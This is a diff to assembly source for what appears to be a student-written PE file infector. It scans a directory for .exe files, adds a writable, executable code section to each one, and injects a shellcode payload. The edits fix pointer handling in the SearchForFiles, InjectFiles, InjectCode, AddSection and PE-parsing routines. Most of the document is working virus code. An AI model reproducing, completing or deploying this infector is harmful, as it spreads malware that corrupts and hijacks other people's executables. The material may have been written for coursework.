@@ -25,10 +25,10 @@ LIST_ENTRY32 struct
     Blink dd ?
 LIST_ENTRY32 ends
 
-;LIST_ENTRY64 struct
-    ;Flink dd ?
-    ;Blink dd ?
-;LIST_ENTRY64 ends
+LIST_ENTRY64 struct
+    Flink dd ?
+    Blink dd ?
+LIST_ENTRY64 ends
 
 ifdef _WIN64
 CLIST_ENTRY typedef LIST_ENTRY64
@@ -150,9 +150,9 @@ AlignToBottom proto CurrentStdcallNotation :cword, :cword
 AddSection proto CurrentStdcallNotation :ptr PeHeaders, :cword, : cword, : cword
 LoadPeFile proto CurrentStdcallNotation :cword, :cword, :cword
 ParsePeFileHeader proto CurrentStdcallNotation :cword, :cword
-printFileName proto CurrentStdcallNotation szFileName:ptr dword
-SearchForFiles proto szDir:ptr dword, fileExtension:ptr dword, pe: ptr PeHeaders, func:ptr FileFunc
-InjectFiles proto CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
+printFileName proto CurrentStdcallNotation :ptr dword
+SearchForFiles proto :ptr dword, :ptr dword, : ptr PeHeaders, :ptr FileFunc
+InjectFiles proto CurrentStdcallNotation :ptr cword, :ptr PeHeaders 
 
 DefineStdcallProto CreateFileA, 7
 DefineStdcallProto GetFileSize, 2
@@ -195,18 +195,18 @@ endif
 
 main proc
 
-local   pBase:cword
-local   pLoadLibraryA:cword
-local   pGetProcAddress:cword
-local   hKernelLib:cword
-local   hMsvcrtLib:cword
-local   pExitProcess:cword
-local   pe:PeHeaders
-local 	i:cword
-local 	memory:cword
-local 	pe_:cword
-local szDir[260]:byte
-local szExt[10]:byte
+	local   pBase:cword
+	local   pLoadLibraryA:cword
+	local   pGetProcAddress:cword
+	local   hKernelLib:cword
+	local   hMsvcrtLib:cword
+	local   pExitProcess:cword
+	local   pe:PeHeaders
+	local 	i:cword
+	local 	memory:cword
+	local 	pe_:cword
+	local szDir[260]:byte
+	local szExt[10]:byte
 
 
 	and csp, -16
@@ -270,7 +270,7 @@ main endp
 
 InjectFiles proc CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
 	mov ccx, hFile
-	invoke LoadPeFile, ccx, [pe], 0
+	invoke LoadPeFile, ccx, addr [pe], 0
 
     invoke InjectCode, addr[pe], glShellCode, sizeof(glShellCode)
 
@@ -307,7 +307,7 @@ SearchForFiles proc CurrentStdcallNotation uses csi cdi ccx cax szDir:ptr dword,
     invoke sc_strcat, szDir, addr szExt
     
     ; Call FindFirstFile
-    invoke FindFirstFileA, szDir, addr ffd
+    invoke sc_FindFirstFileA, szDir, addr ffd
     mov hFind, cax
 
     ; Loop through the files
@@ -375,6 +375,7 @@ InjectCode proc CurrentStdcallNotation uses cbx pe:ptr PeHeaders, code:cword, co
     invoke AddSection, pe, cax, [rvaNewSection], [offsetNewSection]
 
     mov cdx, pe	
+    mov cdx, [ccx]
     ;;assume cdx: ptr PeHeaders
     
     ;;помещаем адрес шеллкода
@@ -486,6 +487,7 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
 	local oldFileSize: cword
 	
     mov ccx, pe	
+    mov ccx, [ccx]
     ;;assume ccx: ptr PeHeaders
 	
 	mov csi, [ccx].PeHeaders.nthead
@@ -523,6 +525,7 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
     ;; Новый блок будет заполнен нулями.
 	;; invoke UnloadPeFile, addr [pe]
 	mov ccx, pe
+    mov ccx, [ccx]
 	;;assume ccx: ptr PeHeaders
 	push ccx
 	invoke sc_UnmapViewOfFile, [ccx].PeHeaders.mem
@@ -539,10 +542,12 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
 	add cax, cdi
 	
 	mov ccx, pe	
+    mov ccx, [ccx]
     ;;assume ccx: ptr PeHeaders
 	invoke LoadPeFile, [ccx].PeHeaders.filename, [pe], cax
 	
 	mov cax, pe
+	mov cax, [cax]
 	mov cdi, [cax].PeHeaders.countSec
     mov ccx, [cax].PeHeaders.sections
     imul cdi, SIZEOF IMAGE_SECTION_HEADER
@@ -550,13 +555,12 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
     mov [last_section], ccx
 	
     ;; заполняем элемент в таблице для новой секции
-    invoke sc_memset, dword ptr [last_section], 0, sizeof (IMAGE_SECTION_HEADER)
+    ;;invoke sc_memset, dword ptr [last_section], 0, sizeof (IMAGE_SECTION_HEADER)
 	
     invoke sc_printf, addr [cbx + strFormat - start], addr [last_section]
-	invoke sc_strcpy, dword ptr [last_section], addr [cbx + new_sec - start]
-	mov cax, [last_section]
+	;;invoke sc_strcpy, dword ptr [last_section], addr [cbx + new_sec - start]
 	
-	mov csi, [last_section]
+	mov cax, last_section
 	mov cdi, [newVirtualAndFileSize]
 	mov [cax].IMAGE_SECTION_HEADER.Misc.VirtualSize, cdi
 	
@@ -571,9 +575,10 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
 	
 	mov cdi, IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_CNT_CODE
 	mov [cax].IMAGE_SECTION_HEADER.Characteristics, cdi	
-
+	
     ;; увеличиваем количество секций
     mov ccx, pe	
+    mov ccx, [ccx]
     ;;assume ccx: ptr PeHeaders
     
     mov csi, [ccx].PeHeaders.nthead
@@ -599,6 +604,7 @@ RvaToOffset proc CurrentStdcallNotation uses cbx ccx cdx cdi csi rva:cword, pe:p
     local NumberSection:cword
     
     mov ccx, pe	
+	mov ccx, [ccx]
     ;;assume ccx: ptr PeHeaders
 
 	mov cax, [ccx].PeHeaders.sections
@@ -648,6 +654,7 @@ RvaToOffset endp
 
 ParsePeFileHeader proc CurrentStdcallNotation uses cbx cdx mem:cword, pe:cword
 	mov cdx, [pe]
+	mov cdx, [cdx]
     ;;assume cdx: ptr PeHeaders
 
     ;;указатель на заголовок PE
@@ -695,6 +702,7 @@ ParsePeFileHeader proc CurrentStdcallNotation uses cbx cdx mem:cword, pe:cword
 
     ;;получаем инфомацию об экспорте
     mov cdx, pe
+	mov cdx, [cdx]
     mov cdi, [cdx].PeHeaders.nthead
     mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
     .if cax
@@ -714,6 +722,7 @@ ParsePeFileHeader proc CurrentStdcallNotation uses cbx cdx mem:cword, pe:cword
 
     ;;получаем информацию об импорте
     mov cdx, pe
+	mov cdx, [cdx]
     mov cdi, [cdx].PeHeaders.nthead
     mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
     .if cax
@@ -737,6 +746,7 @@ ParsePeFileHeader endp
 
 LoadPeFile proc CurrentStdcallNotation uses cbx filename:cword, pe:cword, filesize:cword
     mov ccx, [pe]
+    mov ccx, [ccx]
     ;;assume ccx: ptr PeHeaders
 
     mov cax, [filename]
@@ -970,7 +980,7 @@ str_Kernel32 db "kernel32.dll", 0
 str_Hello db "hello.exe", 0
 new_sec db ".new", 0
 outputFormat db "%s", 13, 10, 0
-dirPath db 'C:\Users\Labour\Downloads\hello', 0
+dirPath db 'C:\Users\dana\uni\4course\code\pandora_box\virus_sc\name\name', 0
 exeExt db '\*.exe', 0
 
 strCucdir:
